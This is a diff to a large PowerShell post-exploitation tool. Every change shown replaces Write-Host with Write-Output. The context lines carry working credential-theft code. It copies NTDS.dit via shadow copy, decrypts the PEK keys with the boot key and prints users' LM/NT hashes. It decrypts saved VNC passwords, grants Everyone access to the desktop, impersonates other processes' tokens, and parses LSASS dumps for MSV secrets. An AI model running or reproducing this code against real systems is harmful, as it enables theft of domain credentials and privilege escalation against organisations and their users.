 				}
 			}
@@ -4146,12 +4146,12 @@ function TagToRecord($Cursor, $Tag, $FilterTables, $Version, $Revision, $PageSiz
 					$TAGGED_DATA_TYPE_MULTI_VALUE = 8
 					If ($ItemFlag -band $TAGGED_DATA_TYPE_COMPRESSED)
 					{
-						Write-Host ("[...] Unsupported tag column: {0}, flag: 0x{1:X}" -f ($Column, $ItemFlag))
+						Write-Output ("[...] Unsupported tag column: {0}, flag: 0x{1:X}" -f ($Column, $ItemFlag))
 						$Record[$Column] = $Null
 					}
 					ElseIf ($ItemFlag -band $TAGGED_DATA_TYPE_MULTI_VALUE)
 					{
-						Write-Host ("[...] Multivalue detected in column {0}, returning raw results" -f ($Column))
+						Write-Output ("[...] Multivalue detected in column {0}, returning raw results" -f ($Column))
 						$Record[$Column] = $Tag[$OffsetItem..($OffsetItem + $ItemSize - 1)]
 					}
 					Else
@@ -4199,7 +4199,7 @@ function TagToRecord($Cursor, $Tag, $FilterTables, $Version, $Revision, $PageSiz
 				$StringCodePages = @(1200, 20127)
 				If (-not ($StringCodePages -Contains $ColumnRecord["CodePage"]))
 				{
-					Write-Host ("[...] Unknown codepage 0x{0:X}" -f ($ColumnRecord["CodePage"]))
+					Write-Output ("[...] Unknown codepage 0x{0:X}" -f ($ColumnRecord["CodePage"]))
 				}
 				Else
 				{
@@ -4281,17 +4281,17 @@ function GetNextRow($NTDSContent, $Cursor, $FilterTables, $PageRecordLength, $Ve
 			# Leaf Page
 			If (($PageRecord["PageFlags"] -band $FLAGS_SPACE_TREE) -gt 0)
 			{
-				Write-Host "[...] FLAGS_SPACE_TREE exception"
+				Write-Output "[...] FLAGS_SPACE_TREE exception"
 				return $Null
 			}
 			ElseIf (($PageRecord["PageFlags"] -band $FLAGS_INDEX) -gt 0)
 			{
-				Write-Host "[...] FLAGS_INDEX exception"
+				Write-Output "[...] FLAGS_INDEX exception"
 				return $Null
 			}
 			ElseIf (($PageRecord["PageFlags"] -band $FLAGS_LONG_VALUE) -gt 0)
 			{
-				Write-Host "[...] FLAGS_LONG_VALUE exception"
+				Write-Output "[...] FLAGS_LONG_VALUE exception"
 				return $Null
 			}
 			Else
@@ -4462,8 +4462,8 @@ function ParsePageRecord($PageData, $PageRecord, $PageRecordLength, $Version, $R
 					$CatalogEntry["SpaceUsage"] = [BitConverter]::ToUInt32($LeafEntry["EntryData"][18..21], 0)
 					$CatalogEntry["Trailing"] = $LeafEntry["EntryData"][22..($LeafEntry["EntryData"].Length-1)]
 				}
-				ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_CALLBACK) { Write-Host "[...] Callback type not supported"; Break }
-				Else { Write-Host ("[...] Unknown catalog type 0x{0:X2}" -f ($CatalogEntry["DataType"])); Break }
+				ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_CALLBACK) { Write-Output "[...] Callback type not supported"; Break }
+				Else { Write-Output ("[...] Unknown catalog type 0x{0:X2}" -f ($CatalogEntry["DataType"])); Break }
 
 				# Parse item name
 				If ($DataDefinitionHeader["LastVariableDataType"] -gt 127) { $NumEntries = $DataDefinitionHeader["LastVariableDataType"] - 127 }
@@ -4497,7 +4497,7 @@ function ParsePageRecord($PageData, $PageRecord, $PageRecordLength, $Version, $R
 					$lvName = [System.Text.Encoding]::ASCII.GetString($LeafEntry["EntryData"][($DataDefinitionHeader["VariableSizeOffset"] + 7)..($DataDefinitionHeader["VariableSizeOffset"] + 7 + $lvLen - 1)])
 					$Global:PageTables[$Global:CurrentTable]["LongValues"][$lvName] = $LeafEntry
 				}
-				Else { Write-Host ("[...] Unknown type 0x{0:X2}" -f ($CatalogEntry["Type"])); Break }
+				Else { Write-Output ("[...] Unknown type 0x{0:X2}" -f ($CatalogEntry["Type"])); Break }
 			}
 		}
 	}
@@ -4507,7 +4507,7 @@ function GetPageRecord($NTDSContent, $PageNum, $Version, $Revision, $PageSize)
 {
 	$Start = ($PageNum + 1) * $PageSize
 	$End = $Start + $PageSize
-	# Write-Host ("Trying to fetch page {0} (0x{1:X2})" -f ($PageNum, $Start))
+	# Write-Output ("Trying to fetch page {0} (0x{1:X2})" -f ($PageNum, $Start))
 
 	$PageData = $NTDSContent[$Start..($End-1)]
 
@@ -4623,20 +4623,20 @@ function PrintCatalog()
 {
 	ForEach ($Table in ($Global:PageTables).Keys)
 	{
-		Write-Host ("[{0}]" -f ($Table))
+		Write-Output ("[{0}]" -f ($Table))
 		$CurrentTable = ($Global:PageTables)[$Table]
 
-		Write-Host ("`tColumns")
+		Write-Output ("`tColumns")
 		ForEach ($Column in ($CurrentTable["Columns"]).Keys)
 		{
 			$CurrentColumnRecord = $CurrentTable["Columns"][$Column]["Record"]
-			Write-Host ("`t`t{0}`t{1}`t{2}" -f ($CurrentColumnRecord["Identifier"], $Column, $CurrentColumnRecord["ColumnType"]))
+			Write-Output ("`t`t{0}`t{1}`t{2}" -f ($CurrentColumnRecord["Identifier"], $Column, $CurrentColumnRecord["ColumnType"]))
 		}
 
-		Write-Host ("`tIndexes")
+		Write-Output ("`tIndexes")
 		ForEach ($Index in ($CurrentTable["Indexes"]).Keys)
 		{
-			Write-Host ("`t`t{0}" -f ($Index))
+			Write-Output ("`t`t{0}" -f ($Index))
 		}
 	}
 }
@@ -4832,7 +4832,7 @@ function DecryptUserRecord($UserRecord, $PEKs)
 	}
 	$UserInfo["AccountStatus"] = $AccountStatus
 
-	Write-Host ("[...] {0}:{1}:{2}:{3}:{4}" -f ($AccountStatus, $AccountName, $RID, [System.BitConverter]::ToString($LMHash).Replace("-", ""), [System.BitConverter]::ToString($NTHash).Replace("-", "")))
+	Write-Output ("[...] {0}:{1}:{2}:{3}:{4}" -f ($AccountStatus, $AccountName, $RID, [System.BitConverter]::ToString($LMHash).Replace("-", ""), [System.BitConverter]::ToString($NTHash).Replace("-", "")))
 
 	# TODO: __decryptSupplementalInfo(self, record, prefixTable=None, keysFile=None, clearTextFile=None)
 
@@ -4866,7 +4866,7 @@ function ParseNTDS($NTDSPath, $BootKey)
 	$MaxPageSize = 8192
 
 	# 1- Extract headers from NTDS at page 1
-	Write-Host ("[+] Reading NTDS headers at page 1")
+	Write-Output ("[+] Reading NTDS headers at page 1")
 	$MainHeader = $NTDSContent[0..($MaxPageSize-1)]
 
 	# Structure from Impacket "ese.py" : ESENT_DB_HEADER
@@ -4874,7 +4874,7 @@ function ParseNTDS($NTDSPath, $BootKey)
 	$Signature = $MainHeader[4..7]
 	If (@(Compare-Object $Signature @([Int]0xEF, [Int]0xCD, [Int]0xAB, [Int]0x89) -SyncWindow 0).Length -ne 0)
 	{
-		Write-Host "[...] Invalid NTDS.dit signature"
+		Write-Output "[...] Invalid NTDS.dit signature"
 		Return $Null
 	}
 	$Version = [BitConverter]::ToUInt32($MainHeader[8..11], 0)
@@ -4943,13 +4943,13 @@ function ParseNTDS($NTDSPath, $BootKey)
 	$UnknownFlags = [BitConverter]::ToUInt32($MainHeader[640..643], 0)
 
 	$TotalPages = ([Math]::Floor($NTDSContent.Length / $PageSize)) - 2
-	Write-Host ("[...] Database version = 0x{0:X4}" -f ($Version))
-	Write-Host ("[...] Database revision = 0x{0:X4}" -f ($FileFormatRevision))
-	Write-Host ("[...] Database page size = {0}" -f ($PageSize))
-	Write-Host ("[...] Database total pages = {0}" -f ($TotalPages))
+	Write-Output ("[...] Database version = 0x{0:X4}" -f ($Version))
+	Write-Output ("[...] Database revision = 0x{0:X4}" -f ($FileFormatRevision))
+	Write-Output ("[...] Database page size = {0}" -f ($PageSize))
+	Write-Output ("[...] Database total pages = {0}" -f ($TotalPages))
 
 	# 2- Parse DB starting at page 4
-	Write-Host ("[+] Parse NTDS database from page 4")
+	Write-Output ("[+] Parse NTDS database from page 4")
 	$CATALOG_PAGE_NUMBER = 4
 	ParseCatalog $NTDSContent $CATALOG_PAGE_NUMBER $Version $FileFormatRevision $PageSize
 
@@ -5003,8 +5003,8 @@ function ParseNTDS($NTDSPath, $BootKey)
 			$CatalogEntry["SpaceUsage"] = [BitConverter]::ToUInt32($Entry["EntryData"][18..21], 0)
 			$CatalogEntry["Trailing"] = $Entry["EntryData"][22..($Entry["EntryData"].Length-1)]
 		}
-		ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_CALLBACK) { Write-Host "[...] Callback type not supported"; Return $Null }
-		Else { Write-Host ("[...] Unknown catalog type 0x{0:X2}" -f ($CatalogEntry["DataType"])); Return $Null }
+		ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_CALLBACK) { Write-Output "[...] Callback type not supported"; Return $Null }
+		Else { Write-Output ("[...] Unknown catalog type 0x{0:X2}" -f ($CatalogEntry["DataType"])); Return $Null }
 
 		# Position a cursor at the leaf levels for fast reading
 		$PageNum = $CatalogEntry["FatherDataPageNumber"]
@@ -5092,7 +5092,7 @@ function ParseNTDS($NTDSPath, $BootKey)
 		$AccountTypes = @([UInt32]0x30000000, [UInt32]0x30000001, [UInt32]0x30000002)
 
 		$EncPEKListData = $Null
-		Write-Host ("[+] Searching PEKList into database and decrypt It with BootKey")
+		Write-Output ("[+] Searching PEKList into database and decrypt It with BootKey")
 		While ($True)
 		{
 
@@ -5139,7 +5139,7 @@ function ParseNTDS($NTDSPath, $BootKey)
 		$PEKs = @()
 		If ($EncPEKListData)
 		{
-			Write-Host ("[...] Found Encrypted PEKList = {0}" -f ([System.BitConverter]::ToString($EncPEKListData).Replace("-", "")))
+			Write-Output ("[...] Found Encrypted PEKList = {0}" -f ([System.BitConverter]::ToString($EncPEKListData).Replace("-", "")))
 
 			# Structure from Impacket "secretsdump.py" : PEKLIST_ENC
 			$Header = $EncPEKListData[0..7]
@@ -5173,7 +5173,7 @@ function ParseNTDS($NTDSPath, $BootKey)
 					$Padding = $PEKData[1..3]
 					$PEK = $PEKData[4..19]
 
-					Write-Host ("[...] Decrypted PEK #{0} = {1}" -f ($i, [System.BitConverter]::ToString($PEK).Replace("-", "")))
+					Write-Output ("[...] Decrypted PEK #{0} = {1}" -f ($i, [System.BitConverter]::ToString($PEK).Replace("-", "")))
 					$PEKs += ,($PEK)
 				}
 			}
@@ -5208,7 +5208,7 @@ function ParseNTDS($NTDSPath, $BootKey)
 						Break
 					}
 
-					Write-Host ("[...] Decrypted PEK #{0} = {1}" -f ($Index, [System.BitConverter]::ToString($PEK).Replace("-", "")))
+					Write-Output ("[...] Decrypted PEK #{0} = {1}" -f ($Index, [System.BitConverter]::ToString($PEK).Replace("-", "")))
 					$PEKs += ,($PEK)
 
 					$CurIndex += 1
@@ -5217,12 +5217,12 @@ function ParseNTDS($NTDSPath, $BootKey)
 			}
 			Else
 			{
-				Write-Host ("[...] Unknown Encrypted PEKList Header format")
+				Write-Output ("[...] Unknown Encrypted PEKList Header format")
 				Return $Null
 			}
 
 			# 6- Now we have PEK Keys, Let decrypt each user record
-			Write-Host ("[+] Searching user records into database and decrypt them with PEK keys")
+			Write-Output ("[+] Searching user records into database and decrypt them with PEK keys")
 			$Users = @()
 
 			# Starting from users already cached when searching Encrypted PEKList
@@ -5256,13 +5256,13 @@ function ParseNTDS($NTDSPath, $BootKey)
 		}
 		Else
 		{
-			Write-Host ("[...] No PEKList found into NTDS")
+			Write-Output ("[...] No PEKList found into NTDS")
 			Return $Null
 		}
 	}
 	Else
 	{
-		Write-Host ("[...] No page table 'datatable' into NTDS")
+		Write-Output ("[...] No page table 'datatable' into NTDS")
 		Return $Null
 	}
 }
@@ -5274,7 +5274,7 @@ function Get-NTDS($Method, $BootKey)
 			- Method 1: Get C:\Windows\NTDS\ntds.dit via Shadow Copy and Parse It as Microsoft Extensive Storage Engine (ESE) format
 			- Method 2: Get NTDS.dit via IDL_DRSGetNCChanges()
 	#>
-	Write-Host ("`n[===] Searching NTDS.dit and try to parse It [===]")
+	Write-Output ("`n[===] Searching NTDS.dit and try to parse It [===]")
 
 	If (Test-Path "HKLM:SYSTEM\CurrentControlSet\Services\NTDS\Parameters")
 	{
@@ -5322,7 +5322,7 @@ function Get-NTDS($Method, $BootKey)
 				}
 			}
 
-			Write-Host ("[+] Saved NTDS.dit via Shadow Copy at $NTDSSavePath")
+			Write-Output ("[+] Saved NTDS.dit via Shadow Copy at $NTDSSavePath")
 
 			# Now we have NTDS.dit at C:\Windows\Temp\NTDS.dit, Let parse It using Microsoft Extensive Storage Engine (ESE) format
 			$Users = ParseNTDS $NTDSSavePath $BootKey
@@ -5337,7 +5337,7 @@ function Get-NTDS($Method, $BootKey)
 	}
 	Else
 	{
-		Write-Host ("[-] Computer is not a DC")
+		Write-Output ("[-] Computer is not a DC")
 		Return $Null
 	}
 }
@@ -5367,7 +5367,7 @@ function DecryptVNCPwd($Key, $PwdBytes)
 	{
 		If (($PwdBytes.Length % 8) -ne 0)
 		{
-			Write-Host ("[WARNING] Decrypted pwd will be truncated to 8 bytes (Encrypted pwd length > 8 and not divisible by 8)")
+			Write-Output ("[WARNING] Decrypted pwd will be truncated to 8 bytes (Encrypted pwd length > 8 and not divisible by 8)")
 			$PwdBytes = $PwdBytes[0..7]
 		}
 	}
@@ -5395,7 +5395,7 @@ function Get-VNCPwds()
 		Get-VNCPwds: Get Hex Encoded VNC passwords from registries or files (depending on VNC server), and decrypt them with same VNC Secret Key
 	#>
 
-	Write-Host ("`n[===] Searching VNC pwds and decrypt them with same VNC Secret Key [===]")
+	Write-Output ("`n[===] Searching VNC pwds and decrypt them with same VNC Secret Key [===]")
 
 	$RegPaths = @("HKLM:SOFTWARE\RealVNC\vncserver", "HKLM:SOFTWARE\TightVNC\Server", "HKLM:SOFTWARE\Wow6432Node\TightVNC\Server", "HKLU:SOFTWARE\TigerVNC\WinVNC4")
 	$FilePaths = @("$Env:Programfiles\UltraVNC\ultravnc.ini", "$Env:Programfiles (x86)\UltraVNC\ultravnc.ini", "$Env:Programfiles\Uvnc Bvba\UltraVNC\ultravnc.ini", "$Env:Programfiles (x86)\Uvnc Bvba\UltraVNC\ultravnc.ini")
@@ -5419,7 +5419,7 @@ function Get-VNCPwds()
 					$ClearTextBytes = DecryptVNCPwd $VNCKey $PwdEncryptedBytes
 					$ClearText = [System.Text.Encoding]::ASCII.GetString($ClearTextBytes)
 
-					Write-Host ("[+] Decrypted {0} = {1}" -f ("$RegPath\$Key", $ClearText))
+					Write-Output ("[+] Decrypted {0} = {1}" -f ("$RegPath\$Key", $ClearText))
 				}
 			}
 		}
@@ -5442,7 +5442,7 @@ function Get-VNCPwds()
 							$ClearTextBytes = DecryptVNCPwd $VNCKey $PwdEncryptedBytes
 							$ClearText = [System.Text.Encoding]::ASCII.GetString($ClearTextBytes)
 
-							Write-Host ("[+] Decrypted {0} = {1}" -f ($FilePath, $ClearText))
+							Write-Output ("[+] Decrypted {0} = {1}" -f ($FilePath, $ClearText))
 						}
 					}
 				}
@@ -5450,7 +5450,7 @@ function Get-VNCPwds()
 		}
 	}
 
-	If (-not ($FindOne)) { Write-Host "[-] No VNC pwds found" }
+	If (-not ($FindOne)) { Write-Output "[-] No VNC pwds found" }
 }
 
 <##################>
@@ -5463,7 +5463,7 @@ function Set-DesktopACLs
 	# Enable SeSecurityPrivilege
 	If (-not (EnablePrivilege "SeSecurityPrivilege"))
 	{
-		Write-Host ("[-] Failed to enable SeSecurityPrivilege`n")
+		Write-Output ("[-] Failed to enable SeSecurityPrivilege`n")
 		return $False
 	}
 
@@ -5473,7 +5473,7 @@ function Set-DesktopACLs
 
 	if ($hWinsta -eq [IntPtr]::Zero)
 	{
-		Write-Host ("[-] OpenWindowStationW() failed with error {0}`n" -f ([TokensAPI]::GetLastError()));
+		Write-Output ("[-] OpenWindowStationW() failed with error {0}`n" -f ([TokensAPI]::GetLastError()));
 		return $False
 	}
 
@@ -5484,7 +5484,7 @@ function Set-DesktopACLs
 	$hDesktop = [TokensAPI]::OpenDesktopA("default", 0, $False, [TokensAPI]::DESKTOP_GENERIC_ALL -bor [TokensAPI]::WRITE_DAC)
 	if ($hDesktop -eq [IntPtr]::Zero)
 	{
-		Write-Host ("[-] OpenDesktopA() failed with error {0}`n" -f ([TokensAPI]::GetLastError()));
+		Write-Output ("[-] OpenDesktopA() failed with error {0}`n" -f ([TokensAPI]::GetLastError()));
 		return $False
 	}
 
@@ -5504,7 +5504,7 @@ function Set-DesktopACLToAllowEveryone($hObject)
 	$retVal = [TokensAPI]::GetSecurityInfo($hObject, 0x7, [TokensAPI]::DACL_SECURITY_INFORMATION, [Ref]$ppSidOwner, [Ref]$ppSidGroup, [Ref]$ppDacl, [Ref]$ppSacl, [Ref]$ppSecurityDescriptor)
 	if ($retVal -ne 0)
 	{
-		Write-Host ("[-] GetSecurityInfo() failed with error {0}`n" -f ($retVal));
+		Write-Output ("[-] GetSecurityInfo() failed with error {0}`n" -f ($retVal));
 		return $False
 	}
 
@@ -5518,7 +5518,7 @@ function Set-DesktopACLToAllowEveryone($hObject)
 		$Success = [TokensAPI]::CreateWellKnownSid(1, [IntPtr]::Zero, $pAllUsersSid, [Ref]$RealSize)
 		if (-not $Success)
 		{
-			Write-Host ("[-] CreateWellKnownSid() failed with error {0}`n" -f ([TokensAPI]::GetLastError()));
+			Write-Output ("[-] CreateWellKnownSid() failed with error {0}`n" -f ([TokensAPI]::GetLastError()));
 			return $False
 		}
 
@@ -5548,7 +5548,7 @@ function Set-DesktopACLToAllowEveryone($hObject)
 		$RetVal = [TokensAPI]::SetEntriesInAclW(1, [Ref]$ExplicitAccess, $ppDacl, [Ref]$NewDacl)
 		if ($RetVal -ne 0)
 		{
-			Write-Host ("[-] SetEntriesInAclW() failed with error {0}`n" -f ($retVal));
+			Write-Output ("[-] SetEntriesInAclW() failed with error {0}`n" -f ($retVal));
 			return $False
 		}
 
@@ -5556,7 +5556,7 @@ function Set-DesktopACLToAllowEveryone($hObject)
 
 		if ($NewDacl -eq [IntPtr]::Zero)
 		{
-			Write-Host ("[-] New DACL is null`n");
+			Write-Output ("[-] New DACL is null`n");
 			return $False
 		}
 
@@ -5564,7 +5564,7 @@ function Set-DesktopACLToAllowEveryone($hObject)
 		$RetVal = [TokensAPI]::SetSecurityInfo($hObject, 0x7, [TokensAPI]::DACL_SECURITY_INFORMATION, $ppSidOwner, $ppSidGroup, $NewDacl, $ppSacl)
 		if ($RetVal -ne 0)
 		{
-			Write-Host ("[-] SetSecurityInfo() failed with error {0}`n" -f ($retVal));
+			Write-Output ("[-] SetSecurityInfo() failed with error {0}`n" -f ($retVal));
 			return $False
 		}
 
@@ -5577,7 +5577,7 @@ function Set-DesktopACLToAllowEveryone($hObject)
 
 function ListSessionTokens
 {
-	Write-Host ("`n[===] Listing Session Tokens [===]")
+	Write-Output ("`n[===] Listing Session Tokens [===]")
 
 	# Load Tokens functions
 	LoadTokensAPI
@@ -5585,7 +5585,7 @@ function ListSessionTokens
 	# Enable require privilege: SeDebugPrivilege
 	If (-not (EnablePrivilege "SeDebugPrivilege"))
 	{
-		Write-Host ("[-] Failed to enable SeDebugPrivilege`n")
+		Write-Output ("[-] Failed to enable SeDebugPrivilege`n")
 		return
 	}
 
@@ -5602,18 +5602,18 @@ function ListSessionTokens
 	$Succeeded = [TokensAPI]::EnumProcesses($ProcessIds, $ArrayBytesSize, [ref]$BytesCopied)
 	If (-not $Succeeded)
 	{
-		Write-Host ("[-] EnumProcesses() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
+		Write-Output ("[-] EnumProcesses() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
 		return
 	}
 	$NbProcesses = $BytesCopied / [System.Runtime.InteropServices.Marshal]::SizeOf((New-Object UInt32))
 
 	If ($NbProcesses -eq 0)
 	{
-		Write-Host ("[-] Failed to enumerate any process`n")
+		Write-Output ("[-] Failed to enumerate any process`n")
 		return
 	}
 
-	Write-Host ("[+] Format = ProcessID:SessionID:Domain:UserName:SID:LogonID:TokenType:LogonType")
+	Write-Output ("[+] Format = ProcessID:SessionID:Domain:UserName:SID:LogonID:TokenType:LogonType")
 
 	# Open each process
 	For ($i = 0; $i -lt $NbProcesses; $i += 1)
@@ -5750,7 +5750,7 @@ function ListSessionTokens
 				$Discard = [TokensAPI]::CloseHandle($LogonSessionDataPtr)
 
 				# ProcessID:SessionID:Domain:UserName:SID:LogonID:TokenType:LogonType
-				Write-Host ("[+] {0}:{1}:{2}:{3}:{4}:{5}:{6}:{7}" -f ($ProcessIds[$i], $SessionID, $Domain, $UserName, $SID, $LogonID, $TokenType, $LogonType))
+				Write-Output ("[+] {0}:{1}:{2}:{3}:{4}:{5}:{6}:{7}" -f ($ProcessIds[$i], $SessionID, $Domain, $UserName, $SID, $LogonID, $TokenType, $LogonType))
 			}
 		}
 	}
@@ -5762,11 +5762,11 @@ function ImpersonateToken($ProcID, $Method)
 {
 	If ((-not $ProcID) -or (-not $Method))
 	{
-		Write-Host ("`n[-] You must provide ProcID and Method parameters`n" -f ($SIDToImpersonate))
+		Write-Output ("`n[-] You must provide ProcID and Method parameters`n" -f ($SIDToImpersonate))
 		return
 	}
 
-	Write-Host ("`n[+] Try to impersonate Session Token of process ID = {0}" -f ($ProcID))
+	Write-Output ("`n[+] Try to impersonate Session Token of process ID = {0}" -f ($ProcID))
 	$ProcFound = $False
 
 	# Load Tokens functions
@@ -5775,7 +5775,7 @@ function ImpersonateToken($ProcID, $Method)
 	# Enable require privilege: SeDebugPrivilege
 	If (-not (EnablePrivilege "SeDebugPrivilege"))
 	{
-		Write-Host ("[-] Failed to enable SeDebugPrivilege`n")
+		Write-Output ("[-] Failed to enable SeDebugPrivilege`n")
 		return
 	}
 
@@ -5787,14 +5787,14 @@ function ImpersonateToken($ProcID, $Method)
 	$Succeeded = [TokensAPI]::EnumProcesses($ProcessIds, $ArrayBytesSize, [ref]$BytesCopied)
 	If (-not $Succeeded)
 	{
-		Write-Host ("[-] EnumProcesses() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
+		Write-Output ("[-] EnumProcesses() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
 		return
 	}
 	$NbProcesses = $BytesCopied / [System.Runtime.InteropServices.Marshal]::SizeOf((New-Object UInt32))
 
 	If ($NbProcesses -eq 0)
 	{
-		Write-Host ("[-] Failed to enumerate any processes`n")
+		Write-Output ("[-] Failed to enumerate any processes`n")
 		return
 	}
 
@@ -5807,7 +5807,7 @@ function ImpersonateToken($ProcID, $Method)
 			$ProcHandle = [TokensAPI]::OpenProcess([TokensAPI+ProcessAccessFlags]::PROCESS_QUERY_INFORMATION, $False, $ProcessIds[$i])
 			If (-not $ProcHandle.ToInt64())
 			{
-				Write-Host ("[-] OpenProcess() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
+				Write-Output ("[-] OpenProcess() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
 				return
 			}
 
@@ -5815,7 +5815,7 @@ function ImpersonateToken($ProcID, $Method)
 			$Succeeded = [TokensAPI]::OpenProcessToken($ProcHandle, [TokensAPI]::TOKEN_DUPLICATE -bor [TokensAPI]::TOKEN_READ -bor [TokensAPI]::TOKEN_QUERY, [ref]$TokenHandle)
 			If (-not $Succeeded)
 			{
-				Write-Host ("[-] OpenProcessToken() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
+				Write-Output ("[-] OpenProcessToken() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
 				$Discard = [TokensAPI]::CloseHandle($ProcHandle)
 				return
 			}
@@ -5825,7 +5825,7 @@ function ImpersonateToken($ProcID, $Method)
 			$Succeeded = [TokensAPI]::DuplicateTokenEx($TokenHandle, [TokensAPI]::TOKEN_ALL_ACCESS, [ref]$lpTokenAttributes, [TokensAPI+SECURITY_IMPERSONATION_LEVEL]::SecurityImpersonation, [TokensAPI+TOKEN_TYPE]::TokenPrimary, [ref]$DupToken)
 			If (-not $Succeeded)
 			{
-				Write-Host ("[-] DuplicateTokenEx() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
+				Write-Output ("[-] DuplicateTokenEx() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
 				$Discard = [TokensAPI]::CloseHandle($ProcHandle)
 				$Discard = [TokensAPI]::CloseHandle($TokenHandle)
 				return
@@ -5836,11 +5836,11 @@ function ImpersonateToken($ProcID, $Method)
 				$Succeeded = [TokensAPI]::ImpersonateLoggedOnUser($DupToken)
 				If (-not $Succeeded)
 				{
-					Write-Host ("[-] ImpersonateLoggedOnUser() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
+					Write-Output ("[-] ImpersonateLoggedOnUser() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
 				}
 				Else
 				{
-					Write-Host ("[+] Successfully impersonated token of requested process ID with ImpersonateLoggedOnUser()`n")
+					Write-Output ("[+] Successfully impersonated token of requested process ID with ImpersonateLoggedOnUser()`n")
 				}
 			}
 			Else
@@ -5866,11 +5866,11 @@ function ImpersonateToken($ProcID, $Method)
 					$Succeeded = [TokensAPI]::CreateProcessWithTokenW($DupToken, 0, 0, $CmdLinePtr, 0, 0, 0, [ref]$lpStartupInfo, [ref]$lpProcessInformation)
 					If (-not $Succeeded)
 					{
-						Write-Host ("[-] CreateProcessWithTokenW() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
+						Write-Output ("[-] CreateProcessWithTokenW() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
 					}
 					Else
 					{
-						Write-Host ("[+] Successfully impersonated token of requested process ID with CreateProcessWithTokenW()`n")
+						Write-Output ("[+] Successfully impersonated token of requested process ID with CreateProcessWithTokenW()`n")
 					}
 
 					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($CmdLinePtr)
@@ -5881,7 +5881,7 @@ function ImpersonateToken($ProcID, $Method)
 					# It require NT\SYSTEM access and SeAssignPrimaryTokenPrivilege for calling CreateProcessAsUserW()
 					If (-not (EnablePrivilege "SeAssignPrimaryTokenPrivilege"))
 					{
-						Write-Host ("[-] Failed to enable SeAssignPrimaryTokenPrivilege`n")
+						Write-Output ("[-] Failed to enable SeAssignPrimaryTokenPrivilege`n")
 						$Discard = [TokensAPI]::CloseHandle($ProcHandle)
 						$Discard = [TokensAPI]::CloseHandle($TokenHandle)
 						$Discard = [TokensAPI]::CloseHandle($DupToken)
@@ -5894,11 +5894,11 @@ function ImpersonateToken($ProcID, $Method)
 					$Succeeded = [TokensAPI]::CreateProcessAsUserW($DupToken, 0, $CmdLinePtr, 0, 0, $False, 0, 0, 0, [ref]$lpStartupInfo, [ref]$lpProcessInformation)
 					If (-not $Succeeded)
 					{
-						Write-Host ("[-] CreateProcessAsUserW() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
+						Write-Output ("[-] CreateProcessAsUserW() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
 					}
 					Else
 					{
-						Write-Host ("[+] Successfully impersonated token of requested process ID with CreateProcessAsUserW()`n")
+						Write-Output ("[+] Successfully impersonated token of requested process ID with CreateProcessAsUserW()`n")
 						$SpawnProc = Get-CIMInstance -ClassName win32_process -filter "parentprocessid = '$($([System.Diagnostics.Process]::GetCurrentProcess().Id))'" | Select ProcessId
 						Wait-Process -Id $SpawnProc.ProcessId
 					}
@@ -5907,7 +5907,7 @@ function ImpersonateToken($ProcID, $Method)
 				}
 				Else
 				{
-					Write-Host ("[-] Unknown method '{0}' to impersonate Session Tokens`n" -f ($Method))
+					Write-Output ("[-] Unknown method '{0}' to impersonate Session Tokens`n" -f ($Method))
 				}
 			}
 
@@ -5920,7 +5920,7 @@ function ImpersonateToken($ProcID, $Method)
 
 	If (-not $ProcFound)
 	{
-		Write-Host ("[-] No process with ID {0} found`n" -f ($ProcID))
+		Write-Output ("[-] No process with ID {0} found`n" -f ($ProcID))
 	}
 
 	return
@@ -6148,7 +6148,7 @@ function LSASS-Get-MSVSecrets($Dump, $LSADecryptor)
 		# Processor x86
 		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
 		{
-			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
+			Write-Output ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
 			return $Null
 		}
 		ElseIf (($Global:MINBUILD_WIN_VISTA -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_7))
@@ -6169,7 +6169,7 @@ function LSASS-Get-MSVSecrets($Dump, $LSADecryptor)
 		# Processor x64
 		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
 		{
-			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
+			Write-Output ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
 			return $Null
 		}
 		ElseIf (($Global:MINBUILD_WIN_VISTA -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_7))
@@ -6631,7 +6631,7 @@ function LSASS-Get-MSVSecrets($Dump, $LSADecryptor)
 	$MSVTemplate["Decrypted_Credential_Struct"] = $Null
 	If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
 	{
-		Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
+		Write-Output ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
 		return $Null
 	}
 	ElseIf ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_7)
@@ -6687,7 +6687,7 @@ function LSASS-Get-MSVSecrets($Dump, $LSADecryptor)
 		# Processor x86
 		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
 		{
